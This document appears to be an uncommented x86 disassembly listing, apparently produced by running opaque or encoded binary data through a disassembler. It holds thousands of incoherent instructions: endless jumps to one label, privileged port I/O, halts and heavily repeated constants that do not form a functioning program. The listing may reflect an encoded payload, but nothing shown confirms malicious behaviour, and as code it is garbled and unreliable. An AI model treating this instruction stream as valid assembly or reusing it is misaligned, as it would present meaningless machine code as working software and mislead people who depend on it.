and ah ch
jecxz r-xdata
push 0xe085cda0
cmpsd [ esi ] [ edi ]
loop r-xdata
jae r-xdata
mov al 0xa
out dx eax
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ edi ]
or al 0x1c
mov ebx 0x1c33f30a
sbb al 0x73
jae r-xdata
jb r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x74
arpl bx sp
mov esi 0x11390a37
sbb al 0x1c
cmp [ esp + ebx ] ebx
mov [ eax - 0x5441957b ] eax
mov eax 0xa9be6a85
push 0xbe6a853b
scasd [ edi ]
push 0xbe6a853a
lodsd [ esi ]
push 0x3810a3c
sbb al 0x1c
jae r-xdata
test [ edx ] 0x73731c1c
jae r-xdata
pushad
daa
out dx eax
or eax [ eax - 0x5 ]
jecxz r-xdata
mov ebx esp
mov ch 0xb
sub edi [ ebx ]
sbb al 0x1c
test [ edx - 0x62 ] ebp

fsub [ esp + ebp * 8 ]
cmp bl [ esp + ebx ]
aaa
sbb al 0x75
dec edi
jae r-xdata
xor al 0x1c
or eax edi
jae r-xdata
adc eax 0x73731c1c
jae r-xdata
jae r-xdata
or bl bh
or eax 0x73731c1c
add bl [ esp + ebx ]
sbb al 0x96
daa
jae r-xdata
sbb al 0xb3
jae r-xdata
enter 0xa2c 0xfe
jecxz r-xdata
jae r-xdata
push 0xffffffbe
aaa
or bh [ ecx ]
adc [ esp + ebx ] ebx
jecxz r-xdata
pushfd
jmp r-xdata
aaa
push 0xffffffa6
sbb al 0x1c
jae r-xdata
loop r-xdata
jae r-xdata
hlt
jae r-xdata
mov edx 0x73737320
or dh [ edx + 0x2f ]
sbb al 0x73
test [ edx - 0x5a ] ebp
pop ss
mov ebx 0x1c2f720a
sbb al 0x73
in al dx
add al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
or [ edi ] ecx
jae r-xdata
push 0xe76afba3
jae r-xdata
sbb al 0x1c
sbb al 0x1c
jae r-xdata
popad
push ss
jae r-xdata
sbb al 0x73
jae r-xdata
sub [ esp + ebx ] ebx
jae r-xdata
mov ah 0x1c
mov ch 0xeb
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edi + edx ]
sbb al 0xb5
xchg [ eax + 0x2b ] esp
loope r-xdata
jae r-xdata
jae r-xdata
and ebp ebx
mov bl 0x1c
xchg esi eax
pop es
push 0xffffffbe
aas
sbb al 0xb4
sti
mov ah 0xb
pushad
sbb bl [ ebx + esi ]
or bl [ ebx + ebp * 8 + 0x7373e3e3 ]
mov al 0xb0
mov al 0x25
cmpsb [ esi ] [ edi ]
cvtdq2ps xmm4 [ esi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ah [ edx + 0x731c1c02 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x12 ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edx + 0x13 ]
sbb al 0x1c
jae r-xdata
and esp [ ebx + 0x1c0af70a ]
scasb [ di ]
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
test eax 0x6ee3e3e7
mov dh 0xb
or ah [ esi + 0x731c1c2f ]
sbb al 0x73
jae r-xdata
mov ch 0xeb
jae r-xdata
jae r-xdata
jae r-xdata
and al 0x1c
jae r-xdata
add al 0x1c
sbb al 0xb5
push 0x6012c813
and ah cl
nop
push 0xffffffa6
sbb ebp [ esi - 0x5a ]
or ah [ bx + si + 0xb ]
sbb al 0x1c
jae r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
or dh [ esi - 0x76e3e3fc ]
mul [ bx ]
sbb al 0x1c
or al [ ebx + 0x6ae3e3e7 ]
cmpsb [ esi ] [ edi ]
pop ds
shl [ ebx ] 0x1
fisub [ esi + 0x25c80a1f ]
sbb al 0x1c
push 0xffffffa6
pop ds
fsub [ eax ]
in al dx
adc bl [ esp + ebx ]
mov edi esp
outsb
mov ebx 0x1c0c370a
jae r-xdata
mov ch 0x89
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x68
adc ah [ esi + 0x15 ]
in al dx
adc edx [ bx ]
movsb [ edi ] [ esi ]
in al dx
or ebp [ ecx + 0x6ee3e3e7 ]
jae r-xdata
jae r-xdata
rcr [ edx + ecx ] 0x1
jae r-xdata
out 0xe3 eax
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
push 0xfba368e3
push 0xffffffe7
or dh bl
xor ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebx ]
add bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x731c1c02 ] al
jae r-xdata
pushad
lahf
mov al 0xb4
mov dh 0x68
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov bl 0x87
sbb al 0x96
push 0x13e0df93
jae r-xdata
cmp eax [ edx ]
sbb al 0x1c
nop
imul edx [ ebx - 0x1d ] 0xffffffe3
jecxz r-xdata
imul ebp [ esi + 0x17130aef ] 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
punpcklbw mmx1 [ edi ]
out dx eax
jae r-xdata
or bh [ esi + 0x2f ]
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ ecx - 0x18 ]
jecxz r-xdata
push 0x68301c12
and eax 0x1c16aa0a
fnstsw ax
jae r-xdata
dec esp
jae r-xdata
jae r-xdata
push ds
outsd
je r-xdata
jae r-xdata
jae r-xdata
pxor mm6 [ eax - 0x1f5df54c ]
jecxz r-xdata
jae r-xdata
or ecx [ edx ]
cmpsb [ esi ] [ edi ]
das
sbb al 0x1c
jae r-xdata
sbb al 0x74
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
or ch [ ebp + 0x1ce3e3e5 ]
adc esp [ edx - 0x23 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or cl [ ecx + ebp + 0x1c ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x87
pushad
sub esp ecx
mov bl 0xa
sub al 0x17
cmpsb [ esi ] [ edi ]
sbb esi [ ebx - 0x1df4da98 ]
mov edx 0x66ec2366
push 0x6e1c1c37
jae r-xdata
or ah [ eax + esi * 8 + 0x7373e3e3 ]
jae r-xdata
or esp edx
mov bl 0x24
jae r-xdata
scasb [ edi ]
jae r-xdata
adc cl [ ecx + 0x24e389e3 ]
cmpsb [ esi ] [ edi ]
push ss
mov ebx esp
mov ebx esp
test [ esi ] esp
and eax 0x245b0fa6
cmpsb [ esi ] [ edi ]
shl [ ebx ] 0x1
mov [ edx + ebp * 2 ] ebx
sahf
pop ds
sbb al 0x75
outsd
jecxz r-xdata
mov esp edi
out dx eax
jae r-xdata
adc eax 0x190a1c1c
dec edi
jae r-xdata
jae r-xdata
test al 0xe3
jae r-xdata
dec di
mov al 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
scasb [ edi ]
out dx eax
or dl [ ebx ]
pop ss
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
or al dh
out 0xe3 al
jecxz r-xdata
jae r-xdata
and eax 0x1c24e20b
jecxz r-xdata
jae r-xdata
or ah [ edx - 0x451c1c20 ]
and bp sp
push 0x1c37
sbb al 0x6e
mov bl 0xb0
sbb al 0xb5
cmpsd [ esi ] [ edi ]
push 0xae681fa6
jecxz r-xdata
jae r-xdata
push 0xffffffe2
jae r-xdata
jae r-xdata
mov al 0x89
jecxz r-xdata
jae r-xdata
xor ebx [ esp + ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
scasb [ edi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
popad
mov edi 0x89e3e3ee
jecxz r-xdata
pop ds
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
jbe r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
mov ch 0xb5
imul esi ebx 0xe3e66d0a
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xe3
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
mov [ esi + 0x2da66a85 ] edx
test [ edx - 0x5a ] ebp
xor ecx [ edx ]
pop ecx
cmp ebx [ esp + ebx ]
mov ebx esp
sbb al 0xb3
scasd [ edi ]
jae r-xdata
movsd [ edi ] [ esi ]
xlat
mov bl 0xa
sub al 0x16
sbb al 0x1c
jae r-xdata
mov edi esp
outsb
jae r-xdata
0xaa0ae3e3 0xe3f0
sub ebp [ ecx - 0xd ]
jae r-xdata
jae r-xdata
fsubrp st3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
insd
out 0xe3 eax
jecxz r-xdata
or [ esp + ebx ] bl
sbb al 0x96
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0xba
mov edx 0x7373202a
jae r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffaf
add ebp [ edx - 0x5a ]
xchg esi eax
jae r-xdata
push ebx
jae r-xdata
test [ edx ] 0x1c1c0f60
jae r-xdata
jae r-xdata
or esp ebx
jmp r-xdata
sbb ecx [ ebx - 0x7c0da6d2 ]
mov ah 0x6a
pop ebp
aaa
jecxz r-xdata
jae r-xdata
mov bl 0xb3
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
retn
sahf
rol [ esi + 0x53 ] cl
mov ah 0x6a
movsd [ edi ] [ esi ]
out dx eax
or ch [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
mov [ ebp - 0x59957b ] ecx
or bh [ edi - 0x16 ]
mov ah 0x66
sub ch ah
jecxz r-xdata
out 0xe3 al
push 0x22e0dfa2
in al dx
mov ecx 0xda85e3e3
jae r-xdata
or eax esp
sbb al 0xa
sbb [ ebx ] esi
sbb al 0x1c
enter 0x692b 0xf3
jae r-xdata
jg r-xdata
jae r-xdata
out dx eax
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
mov bl 0xa6
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
arpl bx sp
jae r-xdata
cmpsb [ esi ] [ edi ]
aas
out 0x6e eax
push 0xb66a8532
nop [ ecx + edi * 4 ] ebx
test [ edx - 0x4a ] ebp
jae r-xdata
pushad
jae r-xdata
jae r-xdata
add eax edx
xor [ ecx - 0x49957a73 ] ecx
push 0xffffffb6
or esi esp
in al 0xe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jecxz r-xdata
jecxz r-xdata
pop es
sbb al 0x1c
add bh [ esi ]
mov edx 0x73202aba
jae r-xdata
test al 0xe3
mov ch 0xb4
sub ch ah
insd
jae r-xdata
fsub [ eax ]
or ch [ edx + 0x73e3e3f0 ]
jae r-xdata
or cl al
xor bl [ esp + ebx ]
shr [ 0x6aba1c1c ] 0x1
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
mov dh 0x1b
push 0xe60a1fa6
jae r-xdata
or [ edx ] ecx
cmpsb [ esi ] [ edi ]
jae r-xdata
mov ecx [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
out dx al
jecxz r-xdata
mov ecx 0x1b66a85
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
push 0xef900a33
jecxz r-xdata
sub esp ebx
jecxz r-xdata
movsb [ edi ] [ esi ]
cmp [ esp + ebx ] bl
jae r-xdata
scasb [ edi ]
or [ esp + ebx ] bl
mov bl 0xb0
jae r-xdata
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
or dl [ esi ]
mov [ 0x1f86609b ] eax
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
push di
sbb ebx [ esp + ebx ]
mov bl 0xa
push ss
sub ebx [ esi ]
or bh [ edx + 0x73e3e3e8 ]
jae r-xdata
and bp sp
jae r-xdata
push 0xffffffa6
jecxz r-xdata
jae r-xdata
mov ebx 0xc39368c7
jae r-xdata
and cx [ edx ]
sbb esp edx
push 0xb31ceba6
jae r-xdata
out 0x6e eax
sbb al 0x1c
arpl [ esi + 0x66ece2f3 ] bx
add bh [ esi ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop es
test [ edx - 0x4a ] ebp
jecxz r-xdata
pop esp
sbb al 0x1c
jae r-xdata
das
jae r-xdata
loop r-xdata
sbb al 0x1c
outsb
in al 0xe3
jecxz r-xdata
or ebp edi
sbb al 0x1c
mov al 0x89
jae r-xdata
jae r-xdata
jecxz r-xdata
and ch [ eax - 0x65 ]
[ eax - 0x45 ]
mov al 0x1c
jae r-xdata
mov eax 0xa1c1c00
and eax 0x731c1c2b
jae r-xdata
in al dx
jecxz r-xdata
jecxz r-xdata
lea edx [ esi ]
sbb al 0x1c
jae r-xdata
and ecx [ edx ]
loop r-xdata
loopne r-xdata
push 0xa368c393
jae r-xdata
jecxz r-xdata
lea eax [ ebp + 0xaffa66a ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
les ecx [ 0x27601c1c ]
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov ecx 0x661c1c01
and ebp esp
out 0xe3 eax
jecxz r-xdata
shl [ ecx ] 0x1
mov dh 0x1
jecxz r-xdata
rcr [ esp ] 0x1
and bp sp
out dx al
aam 0x3f
sbb al 0x1c
push 0x236033a6
fcom [ ebx ]
or ah [ ecx - 0x1b ]
sbb al 0x89
jecxz r-xdata
or dh [ ebp - 0xe ]
jecxz r-xdata
or eax 0xa46e1c1c
jae r-xdata
retn
jae r-xdata
sbb al 0x96
or ebx [ esp + esi * 2 ]
jcxz r-xdata
loop r-xdata
shl ebx 0x1
jecxz r-xdata
mov [ 0xffffffffec22e0df ] al
hlt
jae r-xdata
mov al 0x6e
sub bx [ esi ]
sbb al 0x1c
jae r-xdata
push 0xffffffa6
sbb al 0x1c
loopne r-xdata
retn
jae r-xdata
jae r-xdata
mov ebx esp
or ch [ ebp - 0x19 ]
jecxz r-xdata
mov edx 0xffc7a76a
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov eax [ esi + 0x5a ]
jecxz r-xdata
sbb al 0xb4
jae r-xdata
jae r-xdata
sbb al 0x96
lahf
push 0xffffff9f
sbb al 0xb
mov edx [ esi ]
sbb al 0x1c
push 0xaa68ebae
fild [ eax - 0x4b ]
mov bl 0xa
insb
or ecx [ ebx + 0x681c1c16 ]
scasb [ edi ]
mov bl 0xaf
jae r-xdata
movsb [ edi ] [ esi ]
sbb al 0x6e
sbb al 0xb4
mov al 0xa
jae r-xdata
mov edx [ eax ]
xchg edi eax
xchg [ eax + 0x38a40ab4 ] dh
sbb al 0x1c
jecxz r-xdata
xor [ esp + ebx ] edx
rcr [ esp + esi * 4 ] 0x1
mov ah 0xa
movsd [ edi ] [ esi ]
cmp ebx [ esp + ebx ]
jae r-xdata
or bl [ ecx ]
pop edi
add eax 0x6eb01c1c
sbb esp [ esi + 0x23 ]
in al dx
outsb
das
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x202ab8bd
mov [ 0xffffffffe01ae0fb ] eax
jae r-xdata
cmpsd [ esi ] [ edi ]
or edx ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ esi + edx * 4 ] ebx
sbb al 0xb3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
push 0x65
pop ss
jecxz r-xdata
sbb al 0x60
daa
jecxz r-xdata
div [ si - 0xff5 ]
or eax 0xbaba1c1c
and bp sp
jmp r-xdata
inc esi
pop edx
mov bh 0xa
jae r-xdata
jae r-xdata
sbb al 0x75
add esp ebx
jecxz r-xdata
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0x33
or cl cl
cmp bl [ esp + ebx ]
jae r-xdata
mov [ ebp + 0x7b66a85 ] ecx
cmp esp ebx
jecxz r-xdata
xchg esi eax
jae r-xdata
push edx
sbb bl [ esp + ebx ]
jae r-xdata
mov ebp [ esi ]
pop ecx
xor [ edx + ebp * 2 - 0x1c1cc8a3 ] 0xffffffe3
or ebp [ esi - 0x74e3e3f8 ]
adc [ edi + 0xab4b086 ] dl
and ebp [ edx - 0x42 ]
add ebp [ edx - 0x42 ]
pop ss
test eax ebx
movsd [ edi ] [ esi ]
in eax 0xec
pushad
jmp r-xdata
jae r-xdata
loopne r-xdata
jae r-xdata
sub eax 0x6aba1c1c
jae r-xdata
jae r-xdata
jae r-xdata
popad
call 0x73ba3222
nop [ ebx + esi * 2 ] ebx
jae r-xdata
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ds
or ah dh
xchg ebx eax
jae r-xdata
sbb al 0x73
mov al [ 0x2366bad7 ]
in al dx
shl ebp 0x1
or eax 0x1b656ab0
jecxz r-xdata
push cs
mov bl 0x68
and eax 0x1c12d80b
adc bh dh
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb5
scasd [ edi ]
or cl bh
sub [ esp + ebx ] ebx
jae r-xdata
sbb ebp [ eax + 0x3d ]
test [ edx - 0x42 ] ebp
jae r-xdata
mov al 0xb0
mov ebx eax
mov al 0xb0
or dl [ edx + 0x1a ]
sbb al 0x1c
sbb al 0x73
jae r-xdata
outsb
cmpsd [ esi ] [ edi ]
mov [ 0x27c60a1d ] al
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
mov dh 0x7
sbb [ eax + 0x3b ] ebp
test [ edx - 0x42 ] ebp
pop ds
or ah [ ebx ]
aaa
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
adc ecx [ ecx + 0x6a85b896 ]
mov esi 0xb88a8911
test [ edx - 0x42 ] ebp
pop ss
push 0xbe6a853c
adc eax 0x6a853b68
mov esi 0x853d681b
push 0xffffffbe
cmp ah al
push 0xffffffa6
add [ ebx + 0x6a85c189 ] edi
cmpsb [ esi ] [ edi ]
pop es
or bl ch
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0xba
jae r-xdata
jecxz r-xdata
pushad
and [ edx ] cl
enter 0x1c32 0x1c
jae r-xdata
loopne r-xdata
mov bl 0x1c
mov ch 0xeb
pushad
cwde
mov [ 0xffffffffcb67ece3 ] eax
jecxz r-xdata
jecxz r-xdata
push 0x36d40b1d
sbb al 0x1c
pushad
daa
out dx eax
fiadd [ ebx - 0x131c1cf7 ]
in eax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
or bl [ esp + ebx ]
jae r-xdata
sbb al 0xba
and bp sp
sub [ es : esp + ebx ] bl
and ch ah
push ebx
pop ebp
sbb al 0x1c
or al [ ebx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa7
jae r-xdata
jae r-xdata
stosb [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
out 0xe3 eax
daa
sbb bl [ esp + ebx ]
push 0x66bad7a0
and ebp esp
jecxz r-xdata
mov ah [ ebx - 0x1cd8aae4 ]
jecxz r-xdata
mov [ 0xffffffffd0ebb51c ] eax
sbb al 0xa
sbb al 0x90
outsb
jae r-xdata
jae r-xdata
and bp sp
inc eax
adc [ esp + ebx ] bl
sbb al 0x1c
mov ch 0xaf
jecxz r-xdata
xlat
sbb al 0x6a
jae r-xdata
or al [ ebx + 0xb ]
sbb al 0x1c
in al dx
push esp
test [ edx - 0xd ] ebp
test [ esi + 0x31 ] esp
or ah dh
sbb [ esp + ebx ] ebx
jae r-xdata
or ah [ ecx + 0x36 ]
sbb al 0x1c
out dx eax
jecxz r-xdata
mov edi 0xc7a76ee3
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ 0x73731c1c ] dl
jae r-xdata
push 0xffffffa5
jae r-xdata
push 0x1ae0fba3
jae r-xdata
loope r-xdata
jae r-xdata
mov ah 0xb7
jae r-xdata
jae r-xdata
iretd
movsd [ edi ] [ esi ]
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xb0
mov al 0x89
stc
mov al 0x1c
jne r-xdata
jae r-xdata
jecxz r-xdata
pushad
daa
out dx eax
pushad
xchg edi eax
jae r-xdata
push 0xffffffae
pushad
jecxz r-xdata
sbb al 0x75
arpl bx sp
jecxz r-xdata
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
or dh [ ebx + 0x37 ]
jae r-xdata
mov eax [ ecx + 0x45 ]
or [ eax ] 0xb4
or eax [ ebx - 0x74e3e3f6 ]
lodsb [ ss : esi ]
xchg ecx eax
sub [ esp + ebx ] ebx
or eax [ edi + esi ]
adc esi [ edx + ecx + 0x1c1c5d3a ]
jae r-xdata
xchg esi eax
sbb eax 0x73731c1c
jae r-xdata
mov ah 0xb4
mov al 0xa
mov [ edx ] ss
sbb al 0x1c
jae r-xdata
sub al 0x1c
pushfd
jae r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x1c39070a
sbb al 0x73
jae r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fisttp [ edx ]
or al [ ebx + 0x8 ]
sbb al 0x1c
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + 0x73202ab8 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa7
sbb ah al
jae r-xdata
or ah [ ebp + 0x1ce3e3e3 ]
jae r-xdata
aaa
jae r-xdata
0x7373e3e3 0xb073
mov dl 0x1c
xchg ebx eax
pop ds
push 0xebaee0eb
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
sbb al 0x1c
and bp sp
xchg esi eax
aaa
and esp ebx
mov eax 0x7373202a
jae r-xdata
jae r-xdata
out 0xe3 eax
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
outsw
sbb al 0x6e
jae r-xdata
jae r-xdata
push 0xffffffa6
jmp r-xdata
jae r-xdata
shr [ edx ] 0x1
and bp sp
jpe r-xdata
and ebp esp
outsb
sbb [ si ] bl
adc eax 0xa66a85bb
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
outsb
outsb
sbb ebx [ esi ]
sbb al 0x1c
or bh [ esp + edi ]
sbb al 0x1c
jae r-xdata
and [ ebx + 0x73 ] dh
loopne r-xdata
jae r-xdata
push 0x65878b3b
adc [ esi - 0x5442954c ] dl
or ecx [ ebp + 0x6a1c1c0a ]
adc ch [ edx - 0x5a ]
mov ah 0x6a
movsd [ edi ] [ esi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
add [ ebx ] edi
sti
jae r-xdata
sbb al 0x1c
scasb [ edi ]
jmp r-xdata
jae r-xdata
jmp r-xdata
or bl [ edx - 0x7ae3e3cd ]
push 0xffffffa6
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
in al dx
push esp
mov al 0x60
and ah cl
mov ah 0x68
sbb [ edx ] ecx
or ebx [ ebp + 0x1c ]
sbb al 0x73
jae r-xdata
cmp [ esp + ebx ] ebp
jecxz r-xdata
and esp ebx
jae r-xdata
xchg edi eax
jae r-xdata
jne r-xdata
jae r-xdata
mov ch 0x68
jae r-xdata
xor ebx [ esi ]
cmpsb [ esi ] [ edi ]
sbb esi [ ebx + 0x1c1d050a ]
sbb al 0x73
jae r-xdata
mov [ eax + 0x1c2b140a ] edx
sbb al 0x73
jae r-xdata
or al [ ecx ]
jae r-xdata
push 0x2f730a1b
sbb edx eax
and eax [ ebp - 0x74e65996 ]
out 0xe2 eax
jecxz r-xdata
push 0xffffffa6
sbb al 0x74
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
inc ebx
mov bl 0x68
and eax 0x1c31340a
sbb al 0x73
mov dl 0xb0
mov ch 0xa
inc ebx
or ebx [ esp + ebx ]
push 0x223a0b25
sbb al 0x1c
mov edx 0x66ec2366
sub [ es : esp + ebx ] bl
sbb al 0xa
jae r-xdata
mov esp edi
loop r-xdata
jecxz r-xdata
push 0x202aeba6
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
and al 0xa
jae r-xdata
xchg ebp eax
jae r-xdata
mov al 0xb5
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
sbb al 0x95
arpl bx sp
jae r-xdata
sbb al 0xb3
push 0xb31ceba6
sbb [ si ] bl
jae r-xdata
jae r-xdata
jae r-xdata
shl [ edx + ebp * 2 + 0x390adba5 ] 0x2c
sbb al 0x1c
jecxz r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
and [ esp + ebx ] ebp
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
jae r-xdata
or bh [ esi + 0x731c1c5f ]
xchg edi eax
pop dx
sub al 0x1c
sbb al 0xa
sbb al 0xa
xchg [ edi ] esi
sbb al 0x1c
in al dx
push 0xec156613
jecxz r-xdata
jae r-xdata
sbb [ ebx - 0x1c1c1d19 ] ecx
push 0xffffffa6
sbb al 0x93
push 0xe8e30a24
jae r-xdata
adc [ ebx + 0x140a9089 ] edi
sub ebx [ esp + ebx ]
sbb al 0x73
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
inc ebx
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
xor eax 0x1c1d6a0a
sbb al 0x73
jae r-xdata
jae r-xdata
pushfd
aas
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
0x681c1c5e 0xf3a6
adc esp [ esi + 0x15 ]
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
sbb eax edx
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
jae r-xdata
sub ah [ esi + 0x23 ]
in al dx
jae r-xdata
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sub al 0x1c
jae r-xdata
or [ esp + ebx ] ebx
int1
jae r-xdata
int3
jae r-xdata
or ecx ecx
jae r-xdata
sbb al 0x1c
leave
jae r-xdata
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
or esi ecx
jecxz r-xdata
and eax [ ebp + 0x6e1fa66a ]
mov bl 0x1c
xchg esi eax
outsb
call 0x73ba3808
jae r-xdata
out 0x68 eax
jae r-xdata
mov bl 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa5
mov dh 0xa
mov ah 0x39
outsb
pushad
sahf
out dx eax
jecxz r-xdata
iretd
outsb
mov dh 0x17
or ebp ecx
or [ esp + ebx ] ebx
or bl [ esi + eax ]
sbb al 0x1c
mov al 0xb5
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or cl ah
sbb al 0x1c
jae r-xdata
or cl ah
jecxz r-xdata
movsb [ edi ] [ esi ]
mov al [ 0xffffffffec2366f3 ]
sbb eax 0x68e3e3eb
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ ebx + ebp ]
sbb al 0x1c
sbb ecx [ edx ]
jae r-xdata
test [ eax ] bh
sbb al 0xb3
jae r-xdata
jae r-xdata
aas
sbb al 0x96
jae r-xdata
mov esi 0x731c1c5f
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
mov [ bp + di - 0x1f ] 0xab0ae3e3
adc ebx [ esp + ebx ]
mov cl [ edx ]
je r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
lea eax [ ebp - 0x44f65996 ]
mov [ edi + 0xfa66a85 ] edx
mov ebx 0x760a8a89
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btr [ edx + ebp * 2 + 0x120b0fbe ] esi
adc [ esp + ebx ] ebx
pushad
daa
out dx eax
and bp sp
out 0x29 eax
